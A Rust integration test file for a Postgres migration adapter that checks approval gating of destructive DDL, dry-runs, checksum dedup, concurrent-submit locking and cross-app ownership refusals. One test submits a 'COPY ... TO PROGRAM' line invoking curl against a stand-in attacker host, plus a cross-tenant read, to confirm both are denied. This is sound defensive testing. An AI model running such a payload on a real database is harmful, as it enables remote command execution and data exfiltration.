//! Faithful migration-submission-adapter tests against a REAL Postgres (no shims).
//!
//! Exercises [`zeroship_migrate::submit_migration`] end-to-end: a client hands in a
//! [`Submission`] (raw SQL + light metadata) and the adapter runs the FULL stack —
//! ingest → guard → lint → live-seeded dry-run → gate → apply — under the
//! least-privilege migrator role, with the journal as the dedup ledger. The proofs:
//!
//! - a benign `CREATE TABLE` ⇒ `Applied`; the table exists on the REAL DB;
//! - a `DROP TABLE` of an existing table ⇒ `ApprovalRequired` (SERVER-DERIVED
//!   destructive — NOT applied; the table is still present); re-submit Approved ⇒
//!   `Applied` (table dropped);
//! - forge-resistance: there is NO submission field to mark a DROP non-destructive,
//!   and a `TRUNCATE` / `DROP COLUMN` is ALWAYS gated;
//! - a cross-schema `up` ⇒ `Denied`, nothing run, the real DB untouched;
//! - broken SQL (ALTER on a missing table) ⇒ `DryRunFailed` (caught on the
//!   live-seeded shadow), the real schema + journal untouched;
//! - a non-CONCURRENTLY `CREATE INDEX` ⇒ `Applied` WITH an advisory in the outcome;
//! - an idempotent re-submit of the same script ⇒ `NoOp` (dedup by checksum);
//! - confinement: the applied migration ran under the migrator role; no leaked
//!   shadow DBs / roles afterward.
//!
//! Requires `zeroship_migrate_test` on :5440 and a connecting role with
//! `CREATEROLE` + `CREATEDB` (the runbook `postgres` superuser). Each test uses
//! uniquely-suffixed schemas + project id + shadow prefix, so tests are isolated +
//! re-runnable.

use std::time::Duration;

use compio_postgres::Client;
use zeroship_migrate::{
    deprovision_migrator, ensure_journal, migrator_role_name, provision_migrator, submit_migration,
    Approval, ExecutorConfig, ShadowConfig, Submission, SubmissionOutcome,
};

const DEFAULT_DSN: &str =
    "host=localhost port=5440 user=postgres password=zeroship dbname=zeroship_migrate_test";

fn dsn() -> String {
    std::env::var("MIGRATE_TEST_DB").unwrap_or_else(|_| DEFAULT_DSN.to_string())
}

async fn pg() -> Client {
    let (client, conn) = compio_postgres::connect(&dsn(), compio_postgres::NoTls)
        .await
        .expect("connect to zeroship_migrate_test on :5440");
    compio::runtime::spawn(async move {
        let _ = conn.run().await;
    })
    .detach();
    client
}

fn token() -> String {
    use std::sync::atomic::{AtomicU64, Ordering};
    static N: AtomicU64 = AtomicU64::new(0);
    let n = N.fetch_add(1, Ordering::SeqCst);
    let pid = std::process::id();
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    format!("{pid}_{nanos}_{n}")
}

fn cfg_for(tok: &str) -> ExecutorConfig {
    let mut c = ExecutorConfig::new(format!("prj_{tok}"), format!("proj_{tok}"));
    c.meta_schema = format!("meta_{tok}");
    c.statement_timeout = Duration::from_secs(30);
    c.lock_timeout = Duration::from_secs(10);
    let role = migrator_role_name(&c.project_id).unwrap();
    c.with_migrator_role(role)
}

/// A shadow config with a UNIQUE db-name prefix, so the leaked-shadow assertion is
/// scoped to ONE test and never races sibling tests.
fn unique_shadow_cfg() -> (ShadowConfig, String) {
    let prefix: String = format!("zsmig_sub_{}_", token().replace('_', ""))
        .chars()
        .take(40)
        .collect();
    (
        ShadowConfig {
            admin_dsn: dsn(),
            db_name_prefix: prefix.clone(),
        },
        prefix,
    )
}

/// Stand up project schema + meta journal + the migrator role (the real apply path).
async fn setup(conn: &Client, cfg: &ExecutorConfig) {
    conn.batch_execute(&format!(
        "CREATE SCHEMA IF NOT EXISTS \"{}\"",
        cfg.project_schema
    ))
    .await
    .expect("create project schema");
    ensure_journal(conn, cfg).await.expect("ensure journal");
    provision_migrator(conn, cfg)
        .await
        .expect("provision migrator role");
}

async fn teardown(conn: &Client, cfg: &ExecutorConfig) {
    let _ = deprovision_migrator(conn, cfg).await;
    let _ = conn
        .batch_execute(&format!(
            "DROP SCHEMA IF EXISTS \"{}\" CASCADE; DROP SCHEMA IF EXISTS \"{}\" CASCADE;",
            cfg.project_schema, cfg.meta_schema
        ))
        .await;
}

async fn table_exists(conn: &Client, schema: &str, table: &str) -> bool {
    let rows = conn
        .query(
            "SELECT 1 FROM information_schema.tables WHERE table_schema = $1 AND table_name = $2",
            &[&schema, &table],
        )
        .await
        .expect("query table existence");
    !rows.is_empty()
}

async fn column_exists(conn: &Client, schema: &str, table: &str, column: &str) -> bool {
    let rows = conn
        .query(
            "SELECT 1 FROM information_schema.columns \
             WHERE table_schema = $1 AND table_name = $2 AND column_name = $3",
            &[&schema, &table, &column],
        )
        .await
        .expect("query column existence");
    !rows.is_empty()
}

/// Count completed journal rows.
async fn journal_completed_count(conn: &Client, cfg: &ExecutorConfig) -> i64 {
    let rows = conn
        .query(
            &format!(
                "SELECT count(*)::bigint AS n FROM \"{}\".schema_migrations WHERE phase = 'completed'",
                cfg.meta_schema
            ),
            &[],
        )
        .await
        .expect("count journal");
    rows[0].get::<_, i64>("n")
}

/// Count leaked shadow databases for a prefix (confinement assertion).
async fn shadow_db_count(conn: &Client, prefix: &str) -> i64 {
    let like = format!("{prefix}%");
    let rows = conn
        .query(
            "SELECT count(*)::bigint AS n FROM pg_database WHERE datname LIKE $1",
            &[&like],
        )
        .await
        .expect("count shadow dbs");
    rows[0].get::<_, i64>("n")
}

/// Count leaked shadow migrator roles (the shadow role is `migrator_<shadow_db>`,
/// derived from the shadow DB name which is `<prefix>…`).
async fn shadow_role_count(conn: &Client, prefix: &str) -> i64 {
    // migrator_role_name prefixes the role with "zsmig_" + sanitized project id; the
    // shadow project id IS the shadow db name (`<prefix>…`). Match any role whose
    // name embeds the unique shadow prefix.
    let like = format!("%{prefix}%");
    let rows = conn
        .query(
            "SELECT count(*)::bigint AS n FROM pg_roles WHERE rolname LIKE $1",
            &[&like],
        )
        .await
        .expect("count shadow roles");
    rows[0].get::<_, i64>("n")
}

fn submission(name: &str, up: &str) -> Submission {
    Submission {
        name: name.to_string(),
        up: up.to_string(),
        down: None,
        depends_on: Vec::new(),
        repeatable: false,
        timeout_ms: None,
        owner_app: "app_test".to_string(),
    }
}

/// An ownership map (bare table name → owning app) asserting `app_test` owns each
/// of `tables` — what the journaled ownership ledger would carry after `app_test`
/// CREATEd them. A `CREATE TABLE` establishes ownership and needs no entry; an
/// `ALTER`/`DROP`/DML on an existing table must find its owner here (HIGH-2).
fn owns(tables: &[&str]) -> std::collections::HashMap<String, String> {
    tables
        .iter()
        .map(|t| ((*t).to_string(), "app_test".to_string()))
        .collect()
}

/// The empty ownership map — for a submission that only CREATEs (establishes) or
/// is refused before the ownership check (a guard denial).
fn no_owners() -> std::collections::HashMap<String, String> {
    std::collections::HashMap::new()
}

/// A submission declaring a custom `owner_app` (HIGH-2 cross-app tests).
fn submission_as(name: &str, up: &str, owner_app: &str) -> Submission {
    Submission {
        name: name.to_string(),
        up: up.to_string(),
        down: None,
        depends_on: Vec::new(),
        repeatable: false,
        timeout_ms: None,
        owner_app: owner_app.to_string(),
    }
}

/// An ownership map attributing each `table` to `owner`.
fn owned_by(owner: &str, tables: &[&str]) -> std::collections::HashMap<String, String> {
    tables
        .iter()
        .map(|t| ((*t).to_string(), owner.to_string()))
        .collect()
}

// ---------------------------------------------------------------------------

/// A benign CREATE TABLE submission ⇒ Applied; the table exists on the real DB.
#[compio::test]
async fn benign_create_table_submission_applies_for_real() {
    let conn = pg().await;
    let admin = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    let (shadow_cfg, sprefix) = unique_shadow_cfg();
    setup(&conn, &cfg).await;

    let sub = submission(
        "create_orders",
        &format!(
            "CREATE TABLE \"{}\".orders (id bigint PRIMARY KEY, total int)",
            cfg.project_schema
        ),
    );
    let outcome = submit_migration(
        &conn, &admin, &cfg, &shadow_cfg, sub, &no_owners(), Approval::None, "app_test",
    )
    .await
    .expect("submit");

    assert!(
        matches!(outcome, SubmissionOutcome::Applied { .. }),
        "expected Applied, got {outcome:?}"
    );
    assert!(
        table_exists(&conn, &cfg.project_schema, "orders").await,
        "the real table must exist after Applied"
    );
    // No leaked shadow DBs / roles.
    assert_eq!(shadow_db_count(&admin, &sprefix).await, 0, "leaked shadow db");
    assert_eq!(
        shadow_role_count(&admin, &sprefix).await,
        0,
        "leaked shadow role"
    );

    teardown(&conn, &cfg).await;
}

/// A DROP TABLE of an existing table ⇒ ApprovalRequired (SERVER-DERIVED
/// destructive, NOT applied — table still present); re-submit Approved ⇒ Applied
/// (table dropped). The submission never declared destructiveness.
#[compio::test]
async fn drop_table_is_server_gated_then_applies_with_approval() {
    let conn = pg().await;
    let admin = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    let (shadow_cfg, _sprefix) = unique_shadow_cfg();
    setup(&conn, &cfg).await;

    // A real table to drop (created via the adapter so the live structure is real).
    let _ = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission(
            "create_legacy",
            &format!("CREATE TABLE \"{}\".legacy (id bigint)", cfg.project_schema),
        ),
        &no_owners(),
        Approval::None,
        "app_test",
    )
    .await
    .expect("create legacy");
    assert!(table_exists(&conn, &cfg.project_schema, "legacy").await);

    let drop = submission(
        "drop_legacy",
        &format!("DROP TABLE \"{}\".legacy", cfg.project_schema),
    );

    // Without approval ⇒ ApprovalRequired; table still present.
    let gated = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        drop.clone(),
        &owns(&["legacy"]),
        Approval::None,
        "app_test",
    )
    .await
    .expect("submit drop");
    match gated {
        SubmissionOutcome::ApprovalRequired { dry_run_ok, .. } => {
            assert!(dry_run_ok, "the gate is only reached after a passing dry-run");
        }
        other => panic!("expected ApprovalRequired, got {other:?}"),
    }
    assert!(
        table_exists(&conn, &cfg.project_schema, "legacy").await,
        "a gated destructive submission must NOT have dropped the table"
    );

    // With approval ⇒ Applied; table dropped.
    let applied = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        drop,
        &owns(&["legacy"]),
        Approval::Approved,
        "app_test",
    )
    .await
    .expect("submit drop approved");
    assert!(
        matches!(applied, SubmissionOutcome::Applied { .. }),
        "expected Applied, got {applied:?}"
    );
    assert!(
        !table_exists(&conn, &cfg.project_schema, "legacy").await,
        "the table must be dropped after an approved destructive Applied"
    );

    teardown(&conn, &cfg).await;
}

/// Forge-resistance: TRUNCATE and DROP COLUMN are ALWAYS gated (server-derived
/// destructive). The Submission struct has NO field that could mark them safe.
#[compio::test]
async fn truncate_and_drop_column_are_always_gated() {
    let conn = pg().await;
    let admin = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    let (shadow_cfg, _sprefix) = unique_shadow_cfg();
    setup(&conn, &cfg).await;

    // A real table with a droppable column + data.
    submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission(
            "create_t",
            &format!(
                "CREATE TABLE \"{}\".widgets (id bigint, junk text)",
                cfg.project_schema
            ),
        ),
        &no_owners(),
        Approval::None,
        "app_test",
    )
    .await
    .expect("create widgets");

    // TRUNCATE ⇒ gated without approval.
    let trunc = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission(
            "trunc",
            &format!("TRUNCATE TABLE \"{}\".widgets", cfg.project_schema),
        ),
        &owns(&["widgets"]),
        Approval::None,
        "app_test",
    )
    .await
    .expect("submit truncate");
    assert!(
        matches!(trunc, SubmissionOutcome::ApprovalRequired { .. }),
        "TRUNCATE must be server-gated, got {trunc:?}"
    );

    // DROP COLUMN ⇒ gated without approval; column still present.
    let dropcol = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission(
            "drop_junk",
            &format!(
                "ALTER TABLE \"{}\".widgets DROP COLUMN junk",
                cfg.project_schema
            ),
        ),
        &owns(&["widgets"]),
        Approval::None,
        "app_test",
    )
    .await
    .expect("submit drop column");
    assert!(
        matches!(dropcol, SubmissionOutcome::ApprovalRequired { .. }),
        "DROP COLUMN must be server-gated, got {dropcol:?}"
    );
    assert!(
        column_exists(&conn, &cfg.project_schema, "widgets", "junk").await,
        "a gated DROP COLUMN must NOT have dropped the column"
    );

    teardown(&conn, &cfg).await;
}

/// A cross-schema up ⇒ Denied, nothing run, the real DB untouched.
#[compio::test]
async fn cross_schema_up_is_denied_and_runs_nothing() {
    let conn = pg().await;
    let admin = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    let (shadow_cfg, sprefix) = unique_shadow_cfg();
    setup(&conn, &cfg).await;

    let before = journal_completed_count(&conn, &cfg).await;

    // A cross-tenant read + a shell-RCE COPY — both must be hard-denied.
    let denied1 = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission(
            "xtenant",
            &format!(
                "CREATE TABLE \"{}\".t AS SELECT * FROM control.users",
                cfg.project_schema
            ),
        ),
        &no_owners(),
        Approval::Approved,
        "app_test",
    )
    .await
    .expect("submit xtenant");
    assert!(
        matches!(denied1, SubmissionOutcome::Denied { .. }),
        "cross-schema must be Denied, got {denied1:?}"
    );

    let denied2 = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission(
            "rce",
            &format!(
                "COPY \"{}\".t TO PROGRAM 'curl evil.test'",
                cfg.project_schema
            ),
        ),
        &no_owners(),
        Approval::Approved,
        "app_test",
    )
    .await
    .expect("submit rce");
    assert!(
        matches!(denied2, SubmissionOutcome::Denied { .. }),
        "COPY TO PROGRAM must be Denied, got {denied2:?}"
    );

    // Nothing journaled, no table created, no shadow leaked (a denial short-circuits
    // BEFORE the dry-run).
    assert_eq!(
        journal_completed_count(&conn, &cfg).await,
        before,
        "a denied submission must journal nothing"
    );
    assert!(
        !table_exists(&conn, &cfg.project_schema, "t").await,
        "a denied submission must create no table on the real DB"
    );
    assert_eq!(
        shadow_db_count(&admin, &sprefix).await,
        0,
        "a denial must not even spin up a shadow"
    );

    teardown(&conn, &cfg).await;
}

/// Broken SQL (ALTER on a missing table) ⇒ DryRunFailed, caught on the live-seeded
/// shadow; the real schema + journal untouched.
#[compio::test]
async fn broken_sql_is_caught_on_the_shadow_and_leaves_prod_untouched() {
    let conn = pg().await;
    let admin = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    let (shadow_cfg, sprefix) = unique_shadow_cfg();
    setup(&conn, &cfg).await;

    let before = journal_completed_count(&conn, &cfg).await;

    // The `missing` table does not exist anywhere — guard-clean, but it fails to
    // APPLY on the live-seeded shadow. `app_test` is recorded as its owner so the
    // HIGH-2 ownership check passes and the dry-run is what catches the broken SQL
    // (the point of this test).
    let outcome = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission(
            "alter_missing",
            &format!(
                "ALTER TABLE \"{}\".missing ADD COLUMN x int",
                cfg.project_schema
            ),
        ),
        &owns(&["missing"]),
        Approval::Approved,
        "app_test",
    )
    .await
    .expect("submit broken");
    assert!(
        matches!(outcome, SubmissionOutcome::DryRunFailed { .. }),
        "broken SQL must be DryRunFailed, got {outcome:?}"
    );

    // The real journal is untouched (the dry-run is on the shadow only).
    assert_eq!(
        journal_completed_count(&conn, &cfg).await,
        before,
        "a dry-run failure must journal nothing on the real DB"
    );
    // And the shadow was torn down.
    assert_eq!(
        shadow_db_count(&admin, &sprefix).await,
        0,
        "the shadow must be dropped after a dry-run failure"
    );
    assert_eq!(
        shadow_role_count(&admin, &sprefix).await,
        0,
        "the shadow role must be dropped after a dry-run failure"
    );

    teardown(&conn, &cfg).await;
}

/// A non-CONCURRENTLY CREATE INDEX ⇒ Applied WITH an advisory in the outcome.
#[compio::test]
async fn non_concurrent_index_applies_with_an_advisory() {
    let conn = pg().await;
    let admin = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    let (shadow_cfg, _sprefix) = unique_shadow_cfg();
    setup(&conn, &cfg).await;

    submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission(
            "create_items",
            &format!(
                "CREATE TABLE \"{}\".items (id bigint, sku text)",
                cfg.project_schema
            ),
        ),
        &no_owners(),
        Approval::None,
        "app_test",
    )
    .await
    .expect("create items");

    let outcome = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission(
            "idx_items_sku",
            &format!(
                "CREATE INDEX items_sku_idx ON \"{}\".items (sku)",
                cfg.project_schema
            ),
        ),
        &owns(&["items"]),
        Approval::None,
        "app_test",
    )
    .await
    .expect("submit index");

    match outcome {
        SubmissionOutcome::Applied { advisories, .. } => {
            assert!(
                advisories
                    .iter()
                    .any(|a| a.rule == "NON_CONCURRENT_INDEX"),
                "a non-concurrent CREATE INDEX must surface the NON_CONCURRENT_INDEX advisory, got {advisories:?}"
            );
        }
        other => panic!("expected Applied with an advisory, got {other:?}"),
    }

    teardown(&conn, &cfg).await;
}

/// An idempotent re-submit of the same script ⇒ NoOp (dedup by checksum); no
/// duplicate journal apply.
#[compio::test]
async fn idempotent_resubmit_is_a_noop() {
    let conn = pg().await;
    let admin = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    let (shadow_cfg, _sprefix) = unique_shadow_cfg();
    setup(&conn, &cfg).await;

    let up = format!(
        "CREATE TABLE \"{}\".accounts (id bigint PRIMARY KEY)",
        cfg.project_schema
    );

    let first = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission("create_accounts", &up),
        &no_owners(),
        Approval::None,
        "app_test",
    )
    .await
    .expect("first submit");
    assert!(matches!(first, SubmissionOutcome::Applied { .. }));
    let after_first = journal_completed_count(&conn, &cfg).await;

    // Re-submit the SAME script (a fresh version is minted, but the checksum is the
    // same) ⇒ NoOp, no second journal row.
    let second = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission("create_accounts", &up),
        &no_owners(),
        Approval::None,
        "app_test",
    )
    .await
    .expect("second submit");
    assert!(
        matches!(second, SubmissionOutcome::NoOp { .. }),
        "an identical re-submit must be NoOp, got {second:?}"
    );
    assert_eq!(
        journal_completed_count(&conn, &cfg).await,
        after_first,
        "a NoOp must not add a duplicate journal apply"
    );

    teardown(&conn, &cfg).await;
}

/// HIGH-1 — two CONCURRENT identical submissions of a NON-idempotent `up` race
/// the dedup→apply critical section. Exactly ONE must `Applied` and the other
/// `NoOp`; the `up` must run EXACTLY ONCE (one table, one journal completed row).
///
/// # Why this is RED pre-fix and GREEN post-fix
///
/// PRE-FIX: the checksum dedup read ran with NO lock held; the project advisory
/// lock was taken only later inside `executor::apply`, which dedups PENDING by
/// VERSION (each call mints a fresh `MigrationId`). So both submissions passed the
/// unlocked dedup and both reached apply. The `CREATE TABLE` has no
/// `IF NOT EXISTS`, so the second apply fails on the real DB (table already
/// exists) — surfaced as a `SubmitError` (apply failure) or a duplicate journal
/// row. Either way this test fails.
///
/// POST-FIX: the adapter holds the project advisory lock across dedup→apply. The
/// second submission blocks until the first has applied + journaled, then its
/// dedup read sees the now-net-applied checksum and returns `NoOp`. Exactly one
/// `Applied`, one `NoOp`, one table, one journal row.
///
/// Both submissions run on SEPARATE sessions (separate `conn`s) so the
/// session-scoped advisory lock genuinely contends across backends.
#[compio::test]
async fn concurrent_identical_submissions_apply_exactly_once() {
    let conn1 = pg().await;
    let admin1 = pg().await;
    let conn2 = pg().await;
    let admin2 = pg().await;
    let observer = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    let (shadow_cfg1, _p1) = unique_shadow_cfg();
    let (shadow_cfg2, _p2) = unique_shadow_cfg();
    setup(&conn1, &cfg).await;

    // A NON-idempotent `up`: a bare CREATE TABLE (no IF NOT EXISTS). A double-apply
    // fails the second time (relation already exists).
    let up = format!(
        "CREATE TABLE \"{}\".ledger (id bigint PRIMARY KEY, amount int)",
        cfg.project_schema
    );

    // Spawn submission #1 on its own session.
    let cfg_a = cfg.clone();
    let up_a = up.clone();
    let task1 = compio::runtime::spawn(async move {
        submit_migration(
            &conn1,
            &admin1,
            &cfg_a,
            &shadow_cfg1,
            submission("create_ledger", &up_a),
            &no_owners(),
            Approval::None,
            "app_test",
        )
        .await
    });

    // Run submission #2 concurrently on a second session.
    let r2 = submit_migration(
        &conn2,
        &admin2,
        &cfg,
        &shadow_cfg2,
        submission("create_ledger", &up),
        &no_owners(),
        Approval::None,
        "app_test",
    )
    .await
    .expect("submit #2 (no infrastructure fault)");

    let r1 = task1
        .await
        .expect("submit #1 task join")
        .expect("submit #1 (no infrastructure fault)");

    // Exactly one Applied, exactly one NoOp — in EITHER order.
    let applied = [&r1, &r2]
        .iter()
        .filter(|o| matches!(o, SubmissionOutcome::Applied { .. }))
        .count();
    let noop = [&r1, &r2]
        .iter()
        .filter(|o| matches!(o, SubmissionOutcome::NoOp { .. }))
        .count();
    assert_eq!(
        applied, 1,
        "exactly one concurrent submission must Apply, got r1={r1:?} r2={r2:?}"
    );
    assert_eq!(
        noop, 1,
        "the other concurrent submission must NoOp, got r1={r1:?} r2={r2:?}"
    );

    // The `up` ran EXACTLY ONCE: one table, one completed journal row.
    assert!(
        table_exists(&observer, &cfg.project_schema, "ledger").await,
        "the ledger table must exist after the single apply"
    );
    assert_eq!(
        journal_completed_count(&observer, &cfg).await,
        1,
        "exactly one journal completed row — no double apply"
    );

    teardown(&observer, &cfg).await;
}

/// HIGH-2 — `owner_app` is UNTRUSTED. `app_B` may NOT ALTER/DROP/INSERT a table
/// owned by `app_A` (per the ownership map), even though it CLAIMS
/// `owner_app: "app_B"`. The refusal applies NOTHING (real DB + journal
/// untouched). A CREATE of a NEW table by `app_B` IS allowed (establishes
/// ownership). FAILS pre-fix (no ownership check existed on the submit path — the
/// foreign ALTER/DROP/INSERT would have applied).
#[compio::test]
async fn cross_app_alter_drop_dml_is_refused_create_is_allowed() {
    let conn = pg().await;
    let admin = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    let (shadow_cfg, _sprefix) = unique_shadow_cfg();
    setup(&conn, &cfg).await;

    // app_A creates and owns `vault`.
    let created = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission_as(
            "create_vault",
            &format!(
                "CREATE TABLE \"{}\".vault (id bigint PRIMARY KEY, secret text)",
                cfg.project_schema
            ),
            "app_A",
        ),
        &no_owners(),
        Approval::None,
        "app_A",
    )
    .await
    .expect("app_A create vault");
    assert!(matches!(created, SubmissionOutcome::Applied { .. }));
    assert!(table_exists(&conn, &cfg.project_schema, "vault").await);
    let baseline = journal_completed_count(&conn, &cfg).await;

    let map = owned_by("app_A", &["vault"]);

    // app_B (claiming owner_app="app_B") tries to ALTER app_A's vault ⇒ refused.
    let alter = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission_as(
            "b_alter",
            &format!(
                "ALTER TABLE \"{}\".vault ADD COLUMN backdoor text",
                cfg.project_schema
            ),
            "app_B",
        ),
        &map,
        Approval::Approved,
        "app_B",
    )
    .await
    .expect("submit b_alter");
    assert!(
        matches!(alter, SubmissionOutcome::OwnershipDenied { .. }),
        "a non-owner ALTER must be OwnershipDenied, got {alter:?}"
    );
    assert!(
        !column_exists(&conn, &cfg.project_schema, "vault", "backdoor").await,
        "the refused ALTER must NOT have added the column"
    );

    // app_B tries to DROP app_A's vault ⇒ refused.
    let drop = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission_as(
            "b_drop",
            &format!("DROP TABLE \"{}\".vault", cfg.project_schema),
            "app_B",
        ),
        &map,
        Approval::Approved,
        "app_B",
    )
    .await
    .expect("submit b_drop");
    assert!(
        matches!(drop, SubmissionOutcome::OwnershipDenied { .. }),
        "a non-owner DROP must be OwnershipDenied, got {drop:?}"
    );
    assert!(
        table_exists(&conn, &cfg.project_schema, "vault").await,
        "the refused DROP must NOT have dropped the table"
    );

    // app_B tries to INSERT into app_A's vault ⇒ refused.
    let insert = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission_as(
            "b_insert",
            &format!(
                "INSERT INTO \"{}\".vault (id, secret) VALUES (1, 'stolen')",
                cfg.project_schema
            ),
            "app_B",
        ),
        &map,
        Approval::Approved,
        "app_B",
    )
    .await
    .expect("submit b_insert");
    assert!(
        matches!(insert, SubmissionOutcome::OwnershipDenied { .. }),
        "a non-owner INSERT must be OwnershipDenied, got {insert:?}"
    );

    // NOTHING applied by any of the three refusals — journal untouched.
    assert_eq!(
        journal_completed_count(&conn, &cfg).await,
        baseline,
        "no refused cross-app submission may journal anything"
    );

    // app_B CREATEs its OWN new table ⇒ allowed (establishes ownership).
    let own_create = submit_migration(
        &conn,
        &admin,
        &cfg,
        &shadow_cfg,
        submission_as(
            "b_create",
            &format!(
                "CREATE TABLE \"{}\".b_widgets (id bigint PRIMARY KEY)",
                cfg.project_schema
            ),
            "app_B",
        ),
        &map,
        Approval::None,
        "app_B",
    )
    .await
    .expect("submit b_create");
    assert!(
        matches!(own_create, SubmissionOutcome::Applied { .. }),
        "app_B creating its OWN new table must be Applied, got {own_create:?}"
    );
    assert!(
        table_exists(&conn, &cfg.project_schema, "b_widgets").await,
        "app_B's own CREATE must have applied"
    );

    teardown(&conn, &cfg).await;
}
